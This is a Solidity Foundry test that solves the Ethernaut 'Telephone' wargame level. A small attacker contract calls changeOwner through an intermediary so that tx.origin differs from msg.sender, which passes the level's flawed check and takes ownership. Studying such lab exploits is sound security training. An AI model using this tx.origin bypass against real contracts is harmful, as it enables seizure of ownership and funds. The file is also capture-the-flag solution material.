// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Telephone} from "../src/levels/Telephone.sol";

/// Ethernaut #4 "Telephone" → SC01 access control (tx.origin authentication — no exact catalog
/// entry; a known auth anti-pattern). `changeOwner` gates on `tx.origin != msg.sender`, so a call
/// routed through any contract passes. Win: owner == player.
contract TelephoneAttacker {
    function pwn(Telephone t, address who) external {
        t.changeOwner(who); // msg.sender = this contract, tx.origin = the EOA -> differ
    }
}

contract TelephoneTest is Test {
    address player = makeAddr("player");

    function test_solve_telephone() public {
        Telephone lvl = new Telephone();
        TelephoneAttacker a = new TelephoneAttacker();
        a.pwn(lvl, player);
        assertEq(lvl.owner(), player, "owner changed via tx.origin != msg.sender");
    }
}
